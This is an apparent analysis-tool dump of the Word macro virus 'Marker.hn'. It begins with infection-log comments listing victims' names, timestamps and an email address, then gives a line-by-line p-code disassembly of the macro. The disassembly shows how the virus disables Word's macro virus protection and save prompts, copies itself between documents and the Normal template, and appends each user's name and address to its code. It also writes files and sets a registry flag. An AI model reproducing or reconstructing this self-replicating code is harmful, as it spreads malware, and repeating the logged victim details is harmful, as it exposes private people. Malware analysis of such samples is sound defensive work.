' 05:17:41 - суббота, 31 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:27:37 - суббота, 31 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:53:03 - суббота, 31 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 05:03:09 - воскресенье, 1 сен 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:58:52 - воскресенье, 1 сен 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:51:03 - воскресенье, 1 сен 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 02:24:07 - понедельник, 2 сен 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:31:22 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:36:14 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:54:07 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:06:49 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:40:23 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:50:37 - суббота, 26 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:30:18 - воскресенье, 27 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:25:06 - понедельник, 28 май 2001
' buh
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:44:49 - суббота, 29 май 1999
' buh
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:45:05 - суббота, 29 май 1999
' buh
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:54:22 - вторник, 29 май 2001
' Камель
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:50:06 - вторник, 12 июн 2001
' Гилязутдинова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:33:40 - четверг, 14 июн 2001
' Гилязутдинова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:46:19 - понедельник, 18 июн 2001
' .
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:21:56 - понедельник, 18 июн 2001
' .
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:04:00 - четверг, 21 июн 2001
' .
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:04:18 - понедельник, 25 июн 2001
' fayer
' aku@tanak-cakap.com



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.hn
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 59571 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #4:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #5:
' 	QuoteRem 0x0000 0x001D " Привет Кустанайцам из КарГТУ"
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #12:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #14:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #19:
' Line #20:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #21:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #24:
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #30:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #31:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #34:
' Line #35:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #39:
' 	EndIfBlock 
' Line #40:
' Line #41:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #42:
' Line #43:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #44:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #45:
' Line #46:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' Line #50:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #64:
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' Line #68:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #69:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #70:
' Line #71:
' Line #72:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #73:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #75:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #76:
' Line #77:
' Line #78:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #80:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #82:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	ElseBlock 
' Line #85:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' Line #89:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #90:
' Line #91:
' Line #92:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #93:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #94:
' Line #95:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #96:
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' Line #100:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #101:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #102:
' Line #103:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #104:
' Line #105:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #106:
' Line #107:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #108:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #109:
' Line #110:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #111:
' Line #112:
' 	EndIfBlock 
' Line #113:
' Line #114:
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #122:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #123:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #124:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - среда, 3 май 2000"
' Line #125:
' 	QuoteRem 0x0000 0x001E " Пожелал  остаться неизвестным"
' Line #126:
' 	QuoteRem 0x0000 0x0000 ""
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #131:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #132:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #133:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - воскресенье, 14 май 2000"
' Line #134:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #140:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #141:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #142:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - понедельник, 15 май 2000"
' Line #143:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #144:
' 	QuoteRem 0x0000 0x0000 ""
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #149:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #150:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #151:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - вторник, 16 май 2000"
' Line #152:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #158:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #159:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #160:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - среда, 17 май 2000"
' Line #161:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #162:
' 	QuoteRem 0x0000 0x0000 ""
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #167:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #168:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #169:
' 	QuoteRem 0x0000 0x001E " 10:48:08 - среда, 17 май 2000"
' Line #170:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #171:
' 	QuoteRem 0x0000 0x0000 ""
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #176:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #177:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #178:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - среда, 17 май 2000"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #180:
' 	QuoteRem 0x0000 0x0000 ""
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #185:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #186:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #187:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - среда, 17 май 2000"
' Line #188:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #194:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #195:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #196:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - четверг, 18 май 2000"
' Line #197:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #203:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #204:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #205:
' 	QuoteRem 0x0000 0x0020 " 14:57:33 - вторник, 23 май 2000"
' Line #206:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #207:
' 	QuoteRem 0x0000 0x0000 ""
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #212:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #213:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #214:
' 	QuoteRem 0x0000 0x0020 " 16:42:02 - вторник, 23 май 2000"
' Line #215:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #216:
' 	QuoteRem 0x0000 0x0000 ""
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #221:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #222:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #223:
' 	QuoteRem 0x0000 0x001E " 10:13:04 - среда, 24 май 2000"
' Line #224:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #225:
' 	QuoteRem 0x0000 0x0000 ""
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #230:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #231:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #232:
' 	QuoteRem 0x0000 0x0020 " 10:51:44 - суббота, 17 июн 2000"
' Line #233:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #234:
' 	QuoteRem 0x0000 0x0000 ""
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #239:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #240:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #241:
' 	QuoteRem 0x0000 0x0020 " 10:56:16 - суббота, 17 июн 2000"
' Line #242:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #243:
' 	QuoteRem 0x0000 0x0000 ""
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #248:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #249:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #250:
' 	QuoteRem 0x0000 0x0020 " 10:57:13 - суббота, 17 июн 2000"
' Line #251:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #252:
' 	QuoteRem 0x0000 0x0000 ""
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #257:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #258:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #259:
' 	QuoteRem 0x0000 0x0020 " 12:11:33 - суббота, 17 июн 2000"
' Line #260:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #261:
' 	QuoteRem 0x0000 0x0000 ""
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #266:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #267:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #268:
' 	QuoteRem 0x0000 0x0024 " 13:26:34 - понедельник, 19 июн 2000"
' Line #269:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #270:
' 	QuoteRem 0x0000 0x0000 ""
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #275:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #276:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #277:
' 	QuoteRem 0x0000 0x0023 " 13:26:40 - понедельник, 3 июл 2000"
' Line #278:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #279:
' 	QuoteRem 0x0000 0x0000 ""
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #284:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #285:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #286:
' 	QuoteRem 0x0000 0x0023 " 13:27:59 - понедельник, 3 июл 2000"
